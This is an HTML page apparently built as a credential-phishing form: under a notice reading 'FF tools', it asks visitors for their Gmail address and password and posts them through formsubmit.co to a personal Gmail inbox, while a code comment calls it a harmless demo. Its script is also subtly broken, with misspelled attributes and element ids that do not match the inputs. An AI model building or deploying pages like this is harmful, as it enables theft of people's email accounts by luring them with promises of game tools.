<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>User Submission</title>

  <style>
    * {
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }

    body {
      margin: 0;
      background: #f4f6f8;
      color: #222;
    }

    .container {
      max-width: 500px;
      margin: 40px auto;
      padding: 20px;
    }

    .card {
      background: white;
      padding: 25px;
      border-radius: 15px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.08);
    }

    h1 {
      text-align: center;
      margin-bottom: 10px;
    }

    .notice {
      background: #fff3cd;
      border: 1px solid #ffe69c;
      padding: 15px;
      border-radius: 10px;
      margin: 20px 0;
      line-height: 1.5;
    }

    label {
      display: block;
      margin-top: 15px;
      margin-bottom: 6px;
      font-weight: bold;
    }

    input {
      width: 100%;
      padding: 13px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 16px;
    }

    button {
      width: 100%;
      margin-top: 22px;
      padding: 14px;
      border: none;
      border-radius: 8px;
      background: #1877f2;
      color: white;
      font-size: 17px;
      font-weight: bold;
      cursor: pointer;
    }

    button:hover {
      background: #0d65d9;
    }

    #message {
      display: none;
      margin-top: 18px;
      padding: 12px;
      background: #d1e7dd;
      color: #0f5132;
      border-radius: 8px;
      text-align: center;
    }
  </style>
</head>

<body>

  <div class="container">

    <div class="card">

      <h1>User Form</h1>

      <div class="notice">
        <strong>Notice</strong><br>
        FF tools
      </div>

      <form id="userForm" action="https://formsubmit.co/hardikkhuntad25@gmail.com" method="POST">

        <label for="Gmail">Gmail</label>
        <input
          type="text"
          id="khuntad"
          nema="usernema"
          placeholder="ENTER Gmail"
          required
        >

        <label for="password">password</label>
        <input
          type="text"
          id="hardik"
          nema="surnema"
          placeholder="ENTER password"
          required
        >

        <button type="submit">
          Submit
        </button>

      </form>

      <div id="message">
        Your information has been submitted successfully.
      </div>

    </div>

  </div>

  <script>
    document.getElementById("userForm").addEventListener("submit", function(event) {

      

      const Gmail = document.getElementById("Gmail").value.trim();
      const Password = document.getElementById("password").value.trim();

      if (Gmail === "" || password === "") {
        alert("Please enter Gmail and password.");
        return;
      }

      /*
        Temporary demo:
        Information is saved only in this browser.
        Later we can connect this form to a database
        so the ADMIN can see submissions from all users.
      */

      const userData = {
        Gmail: Gmail,
        Password: password,
        submittedAt: new Date().toISOString()
      };

      localStorage.setItem("userSubmission", JSON.stringify(userData));

      document.getElementById("userForm").reset();
      document.getElementById("message").style.display = "block";
    });
  </script>

</body>
</html>
